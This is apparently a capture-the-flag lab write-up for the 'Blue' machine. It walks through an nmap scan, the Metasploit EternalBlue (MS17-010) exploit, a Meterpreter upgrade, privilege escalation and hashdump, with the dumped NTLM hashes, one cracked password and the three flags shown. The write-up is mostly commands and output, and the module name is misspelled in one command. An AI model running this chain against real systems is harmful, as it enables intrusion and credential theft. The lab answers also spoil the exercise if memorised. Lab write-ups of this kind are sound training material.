# BLUE

## 10.10.228.75

## Notes

* `>` is Metasploit Console
* `>>` is Meterpreter on victim
* `C:\>` is cmd on victim

## Scan
```
nmap -sV -sC -oA nmap/blue -p 1-1001 10.10.228.75
```

## Exploit
```
> use exploit/windows/smb/ms17_010_eternalbue
> set RHOSTS 10.10.228.75
> set LHOST tun0
> exploit
```

## Post
```
> background
> post/multi/manage/shell_to_meterpreter
```


## Sessions
```
> sessions
> sessions -i 1
```

## Hashdump
```
>> getsystem
>> migrate 428
>> hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

## Cracking

```
> use post/windows/gather/hashdump
> set SESSION 1
> run
```

Use crackstation.net
`ffb43f0de35be4d9917ac0cc8ad57f8d` => `alqfna22`

## Flags

Use `type` to print file to console

```
> sessions -i 1
>> shell
C:\> cd C:\
C:\> dir
C:\> type flag1.txt

flag{access_the_machine}
```

Use `dir /s` to search for files

```
C:\> dir /s *flag2.txt

Directory of C:\Windows\System32\config
 03/17/2019  02:32 PM                34 flag2.txt
               1 File(s)             34 bytes


C:\> type C:\Windows\System32\config\flag2.txt

flag{sam_database_elevated_access}
```

```
C:\>dir /s *flag3.txt

Directory of C:\Users\Jon\Documents
03/17/2019  02:26 PM                37 flag3.txt
               1 File(s)             37 bytes


C:\>type C:\Users\Jon\Documents\flag3.txt

flag{admin_documents_can_be_valuable}
```